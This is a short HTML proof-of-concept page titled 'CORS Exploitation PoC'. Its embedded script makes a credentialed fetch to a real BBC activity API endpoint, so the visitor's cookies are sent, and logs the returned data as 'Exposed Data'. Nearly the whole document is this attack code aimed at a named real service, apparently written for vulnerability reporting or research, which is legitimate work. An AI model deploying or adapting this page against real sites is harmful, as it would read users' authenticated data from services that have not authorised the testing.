<!DOCTYPE html>
<html>
<head>
    <title>Exploiting CORS Misconfiguration</title>
</head>
<body>
    <h1>CORS Exploitation PoC</h1>
    <script>
        fetch("https://heartbeat.activity.api.bbc.com", {
            method: "GET",
            credentials: "include", // Send cookies or authentication headers
        })
        .then(response => response.json())
        .then(data => console.log("Exposed Data:", data))
        .catch(error => console.error("Error:", error));
    </script>
</body>
</html>
